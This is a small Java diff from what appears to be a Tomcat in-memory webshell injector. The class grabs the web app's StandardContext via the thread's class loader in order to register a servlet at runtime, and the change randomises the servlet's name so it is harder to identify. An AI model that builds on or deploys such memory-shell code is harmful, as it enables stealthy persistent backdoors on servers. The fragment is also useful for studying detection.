@@ -17,7 +17,7 @@ public class TSMSFromThread implements Servlet {
 
 	static {
 		try {
-			String servletName = "su18" + System.nanoTime();
+			String servletName = String.valueOf(System.nanoTime());
 
 			// 获取 standardContext
 			WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
